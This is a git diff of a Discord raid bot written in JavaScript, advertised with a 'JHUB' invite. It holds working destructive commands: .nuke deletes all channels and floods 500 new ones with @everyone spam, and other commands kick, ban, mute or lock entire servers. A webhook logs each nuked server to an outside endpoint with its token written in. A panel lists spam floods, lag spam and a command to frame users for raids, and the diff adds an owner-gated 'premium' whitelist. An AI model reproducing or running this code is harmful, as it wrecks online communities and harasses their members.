@@ -2,20 +2,16 @@ const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = r
 const http = require('http');
 
 const client = new Client({
-    intents: [
-        1,   // GUILDS
-        512, // GUILD_MESSAGES
-        32768, // MESSAGE_CONTENT
-        2,   // GUILD_MEMBERS
-        16   // GUILD_CHANNELS
-    ]
+    intents: [1, 512, 32768, 2, 16]
 });
 
 const TOKEN = process.env.TOKEN;
 const LOG_WEBHOOK = "https://discord.com/api/webhooks/1497802608491106357/1rPNKGuyh780KsnqoWnzAWcXjbPTfRx3jWtcefHcYkdywE7GkibcGwvWqRvZE2CgjHnf";
-const WHITELIST_SERVER = "1475357940088176743"; // Protected server
+const WHITELIST_SERVER = "1475357940088176743";
 const INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1497740024983195668&permissions=8&integration_type=0&scope=bot";
-const EXT_INVITE = "https://discord.com/api/oauth2/authorize?client_id=1489612859179798588&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.com%2Foauth2%2Fauthorized&scope=applications.commands&integration_type=1";
+const EXT_INVITE = "https://discord.com/oauth2/authorize?client_id=1489612859179798588&integration_type=1&scope=applications.commands";
+const OWNER_ID = "1183142340609708072";
+const WHITELIST_ROLE_ID = "1498099673406374029";
 
 http.createServer((req, res) => {
     res.writeHead(200, {'Content-Type': 'text/plain'});
@@ -42,26 +38,42 @@ client.on('messageCreate', async (message) => {
     const args = message.content.trim().split(/\s+/);
     const cmd = args[0].toLowerCase();
 
+    // .whitelist
+    if (cmd === '.whitelist') {
+        if (message.author.id !== OWNER_ID) {
+            return message.reply('You are not the owner').catch(() => {});
+        }
+        const target = message.mentions.members.first();
+        if (!target) return message.reply('Mention someone to whitelist').catch(() => {});
+        target.roles.add(WHITELIST_ROLE_ID).then(() => {
+            message.reply(`Whitelisted ${target.user.tag}`).catch(() => {});
+        }).catch(() => {
+            message.reply('Failed to give role. Make sure I have Manage Roles permission.').catch(() => {});
+        });
+        return;
+    }
+
     // .extpanel
     if (cmd === '.extpanel') {
         const embed = new EmbedBuilder()
             .setTitle('External Bot Commands')
             .setDescription(
                 `**Slash Commands (User Install)**\n` +
-                `/spam — Floods chat with Arabic spam\n` +
-                `/say <message> — Make the bot say anything\n` +
-                `/blame @user — Frame someone for the raid\n` +
-                `/flood — Spam discord.gg/jhub\n\n` +
-                `No admin perms needed. No invite required. Just install to your account.`
+                `/say — Make bot say anything (free)\n` +
+                `/spam — Arabic flood (premium)\n` +
+                `/flood — JHUB flood (premium)\n` +
+                `/custom-spam — Spam anything (premium)\n` +
+                `/l-spam — Zalgo lag spam (premium)\n` +
+                `/blame — Frame someone (premium)\n\n` +
+                `Get whitelisted by the owner to use premium commands.`
             )
             .setColor(0x00ff00)
-            .setFooter({ text: 'Click the button below to add the external bot' });
+            .setFooter({ text: 'Click below to add the external bot' });
 
         const extBtn = new ButtonBuilder()
             .setLabel('Add External Bot')
             .setStyle(ButtonStyle.Link)
             .setURL(EXT_INVITE);
-
         const row = new ActionRowBuilder().addComponents(extBtn);
         message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
         return;
@@ -83,144 +95,57 @@ client.on('messageCreate', async (message) => {
             .setStyle(ButtonStyle.Primary)
             .setCustomId('cmds');
         const row = new ActionRowBuilder().addComponents(inviteBtn, cmdsBtn);
-
         message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
         return;
     }
 
-    // Commands button handler
-    client.on('interactionCreate', async (interaction) => {
-        if (!interaction.isButton()) return;
-        if (interaction.customId === 'cmds') {
-            const embed = new EmbedBuilder()
-                .setTitle('Command List')
-                .setDescription(
-                    `.nuke — Wipes server and spams channels\n` +
-                    `.kick @user — Kicks a member\n` +
-                    `.ban @user — Bans a member\n` +
-                    `.kickall — Kicks all members\n` +
-                    `.banall — Bans all members\n` +
-                    `.muteall — Timeouts all members\n` +
-                    `.lockall — Locks all text channels\n` +
-                    `.panel — Shows main invite panel\n` +
-                    `.extpanel — Shows external bot info`
-                )
-                .setColor(0xff0000)
-                .setFooter({ text: 'Commands do not work in the protected server.' });
-            await interaction.reply({ embeds: [embed], ephemeral: true });
-        }
-    });
-
     // .nuke
     if (cmd === '.nuke') {
-        if (message.guild.id === WHITELIST_SERVER) {
-            return message.reply('Server protected').catch(() => {});
-        }
-
+        if (message.guild.id === WHITELIST_SERVER) return message.reply('Server protected').catch(() => {});
         message.delete().catch(() => {});
         const g = message.guild;
         const originalName = g.name;
         const username = message.author.tag;
         const time = new Date().toISOString();
-
         try {
             await fetch(LOG_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `**Server Nuked**\nName: ${originalName}\nBy: ${username}\nTime: ${time}`
-                })
+                body: JSON.stringify({ content: `**Server Nuked**\nName: ${originalName}\nBy: ${username}\nTime: ${time}` })
             });
         } catch (e) {}
-
         g.setName('NGA GOT NUKED BY JHUB').catch(() => {});
-
         const channels = Array.from(g.channels.cache.values());
-        for (const ch of channels) {
-            ch.delete().catch(() => {});
-            await sleep(100);
-        }
-
+        for (const ch of channels) { ch.delete().catch(() => {}); await sleep(100); }
         for (let i = 0; i < 500; i++) {
-            g.channels.create({name: 'jhub-on-top', type: 0}).then(ch => {
+            g.channels.create({ name: 'jhub-on-top', type: 0 }).then(ch => {
                 if (!ch) return;
-                for (let j = 0; j < 10; j++) {
-                    ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
-                }
+                for (let j = 0; j < 10; j++) ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
             }).catch(() => {});
             await sleep(200);
         }
         return;
     }
 
-    // .kick
-    if (cmd === '.kick') {
-        const member = message.mentions.members.first();
-        if (!member) return message.reply('Mention a user to kick.').catch(() => {});
-        member.kick('Kicked by command').then(() => message.reply(`Kicked ${member.user.tag}`)).catch(() => {});
-        return;
-    }
+    if (cmd === '.kick') { const m = message.mentions.members.first(); if (!m) return message.reply('Mention a user').catch(() => {}); m.kick().then(() => message.reply(`Kicked ${m.user.tag}`)).catch(() => {}); return; }
+    if (cmd === '.ban') { const m = message.mentions.members.first(); if (!m) return message.reply('Mention a user').catch(() => {}); m.ban().then(() => message.reply(`Banned ${m.user.tag}`)).catch(() => {}); return; }
+    if (cmd === '.kickall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.kickable && m.id !== client.user.id) { m.kick().catch(() => {}); c++; await sleep(100); } } message.reply(`Kicked ${c} members`).catch(() => {}); return; }
+    if (cmd === '.banall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.bannable && m.id !== client.user.id) { m.ban().catch(() => {}); c++; await sleep(100); } } message.reply(`Banned ${c} members`).catch(() => {}); return; }
+    if (cmd === '.muteall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.moderatable && m.id !== client.user.id) { m.timeout(28*24*60*60*1000).catch(() => {}); c++; await sleep(100); } } message.reply(`Muted ${c} members`).catch(() => {}); return; }
+    if (cmd === '.lockall') { let c = 0; for (const [, ch] of message.guild.channels.cache) { if (ch.type === 0) { ch.permissionOverwrites.create(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}); c++; await sleep(100); } } message.reply(`Locked ${c} channels`).catch(() => {}); return; }
+});
 
-    // .ban
-    if (cmd === '.ban') {
-        const member = message.mentions.members.first();
-        if (!member) return message.reply('Mention a user to ban.').catch(() => {});
-        member.ban({ reason: 'Banned by command' }).then(() => message.reply(`Banned ${member.user.tag}`)).catch(() => {});
-        return;
-    }
-
-    // .kickall
-    if (cmd === '.kickall') {
-        const members = message.guild.members.cache.filter(m => m.kickable && m.id !== client.user.id);
-        let count = 0;
-        for (const [id, member] of members) {
-            member.kick('KickAll').catch(() => {});
-            count++;
-            await sleep(100);
-        }
-        message.reply(`Kicked ${count} members`).catch(() => {});
-        return;
-    }
-
-    // .banall
-    if (cmd === '.banall') {
-        const members = message.guild.members.cache.filter(m => m.bannable && m.id !== client.user.id);
-        let count = 0;
-        for (const [id, member] of members) {
-            member.ban({ reason: 'BanAll' }).catch(() => {});
-            count++;
-            await sleep(100);
-        }
-        message.reply(`Banned ${count} members`).catch(() => {});
-        return;
-    }
-
-    // .muteall
-    if (cmd === '.muteall') {
-        const members = message.guild.members.cache.filter(m => m.moderatable && m.id !== client.user.id);
-        let count = 0;
-        const muteTime = 28 * 24 * 60 * 60 * 1000;
-        for (const [id, member] of members) {
-            member.timeout(muteTime, 'MuteAll').catch(() => {});
-            count++;
-            await sleep(100);
-        }
-        message.reply(`Muted ${count} members`).catch(() => {});
-        return;
-    }
-
-    // .lockall
-    if (cmd === '.lockall') {
-        const channels = message.guild.channels.cache.filter(ch => ch.type === 0);
-        let count = 0;
-        for (const [id, ch] of channels) {
-            const everyone = message.guild.roles.everyone;
-            ch.permissionOverwrites.create(everyone, { SendMessages: false }).catch(() => {});
-            count++;
-            await sleep(100);
-        }
-        message.reply(`Locked ${count} channels`).catch(() => {});
-        return;
+client.on('interactionCreate', async (interaction) => {
+    if (!interaction.isButton()) return;
+    if (interaction.customId === 'cmds') {
+        const embed = new EmbedBuilder()
+            .setTitle('Command List')
+            .setDescription(
+                `**Owner Only**\n.whitelist @user — Give premium access\n\n` +
+                `.nuke — Wipe server\n.kick @user — Kick member\n.ban @user — Ban member\n.kickall — Kick all\n.banall — Ban all\n.muteall — Timeout all\n.lockall — Lock all channels\n.panel — Invite panel\n.extpanel — External bot info`
+            )
+            .setColor(0xff0000);
+        await interaction.reply({ embeds: [embed], ephemeral: true });
     }
 });
 
